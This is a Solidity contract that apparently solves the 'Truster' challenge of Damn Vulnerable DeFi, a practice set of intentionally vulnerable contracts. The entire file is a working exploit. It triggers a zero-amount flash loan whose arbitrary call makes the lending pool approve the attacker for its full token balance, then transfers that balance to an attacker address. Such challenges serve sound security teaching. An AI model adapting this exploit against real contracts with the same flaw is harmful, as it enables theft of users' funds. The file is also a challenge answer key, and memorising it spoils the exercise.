// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


/**
 * @title TrusterAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterAttacker {
  IERC20 public immutable token;
  TrusterLenderPool public immutable pool;

  constructor (address _token, address _pool) {
    token = IERC20(_token);
    pool = TrusterLenderPool(_pool);
  }

  function attack(address attackerEOA) external {
    // Get the balance in the pool
    uint256 balance = token.balanceOf(address(pool));

    // 'approve' this contract to transfer up to `balance`
    bytes memory payload = abi.encodeWithSignature(
        "approve(address,uint256)",
        address(this),
        balance
    );

    pool.flashLoan(0, attackerEOA, address(token), payload);
    token.transferFrom(address(pool), attackerEOA, balance);
  }

  receive () external payable {}
}